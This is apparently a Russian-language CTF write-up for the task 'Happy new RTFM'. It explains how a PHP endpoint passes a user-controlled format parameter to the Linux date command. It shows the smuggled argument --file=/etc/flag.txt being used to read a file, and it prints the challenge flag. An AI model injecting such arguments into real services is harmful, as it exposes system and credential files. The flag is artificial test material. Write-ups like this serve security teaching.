## Happy new RTFM

На главной странице таска нас встречает обратный отсчет до нового года. Попробуем разобраться как он работает. 

Файл utils.js отправляет запрос /get_date.php, где через  переменную fmt указывает формат времени. get_date.php возвращает текущее время в заданном формате, после чего расчитывается оставшееся время до нового года и запускается таймер.

В самом таймере нет ничего интересного, а вот возможность передавать данные get_date.php выглядит перспективно.

Отправляя туда всякий шлак в попытках разобраться, что именно выполняет данный скрипт, получаем следующий ответ:

```
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Fri, 10 Apr 2020 12:41:25 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
X-Powered-By: PHP/7.4.0
Content-Length: 68

date: invalid option -- 'l'
Try 'date --help' for more information.
```

Тут же понимаем, что это вывод date Linux. Попробуем отправить --help:

```
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Fri, 10 Apr 2020 12:45:49 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 4704
Connection: close
X-Powered-By: PHP/7.4.0
Vary: Accept-Encoding

Usage: date [OPTION]... [+FORMAT]
  or:  date [-u|--utc|--universal] [MMDDhhmm[[CC]YY][.ss]]
Display the current time in the given FORMAT, or set the system date.

Mandatory arguments to long options are mandatory for short options too.
  -d, --date=STRING          display time described by STRING, not 'now'
      --debug                annotate the parsed date,
                              and warn about questionable usage to stderr
  -f, --file=DATEFILE        like --date; once for each line of DATEFILE
  -I[FMT], --iso-8601[=FMT]  output date/time in ISO 8601 format.
                               FMT='date' for date only (the default),
                               'hours', 'minutes', 'seconds', or 'ns'
```

Замечаем опицию -f , умеющую читать дату из файла. Это выглядит как то, что нам нужно. Отправим --file=/etc/flag.txt :

![burp request](https://github.com/WATyag/MSKCTF2020/blob/master/Happy%20new%20RTFM/burp.jpg)

#### Флаг: MSKCTF{1tS_uS3ful_t0_R3AD_A_MANu4l_fR0m_T1m3_t0_tIME}
